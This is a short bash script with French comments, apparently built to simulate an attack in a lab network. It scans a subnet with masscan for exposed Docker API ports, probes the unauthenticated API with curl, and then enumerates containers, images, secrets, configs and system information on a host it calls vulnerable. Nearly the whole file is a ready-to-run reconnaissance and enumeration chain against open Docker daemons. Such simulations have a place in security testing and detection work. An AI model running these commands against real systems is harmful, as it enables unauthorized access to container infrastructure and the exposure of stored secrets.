#!/bin/bash

# Simulation d'un scan réseau pour trouver des hôtes Docker
echo "[$(date '+%Y-%m-%d %H:%M:%S')] [+] Scanning network for Docker hosts..."
# Scan plus ciblé avec un taux plus bas et une plage plus restreinte
masscan -p2375,2376 172.20.0.0/24 --rate=100 --wait=0

# Attente courte pour s'assurer que le daemon Docker est prêt
sleep 5

# Tentatives d'accès à l'API Docker
echo "[+] Attempting to access Docker API..."
for ip in {2..5}; do
    echo "Testing 172.20.0.$ip..."
    curl -s -m 1 http://172.20.0.$ip:2375/version
    curl -s -m 1 http://172.20.0.$ip:2375/containers/json
done

# Énumération des conteneurs sur l'hôte vulnérable connu
echo "[+] Enumerating containers on vulnerable host..."
docker -H tcp://172.20.0.2:2375 ps -a
docker -H tcp://172.20.0.2:2375 images

# Tentative de listing des secrets et configurations
echo "[+] Attempting to list secrets and configs..."
docker -H tcp://172.20.0.2:2375 secret ls
docker -H tcp://172.20.0.2:2375 config ls

# Tentative d'extraction d'informations système
echo "[+] Gathering system information..."
docker -H tcp://172.20.0.2:2375 info
docker -H tcp://172.20.0.2:2375 system df
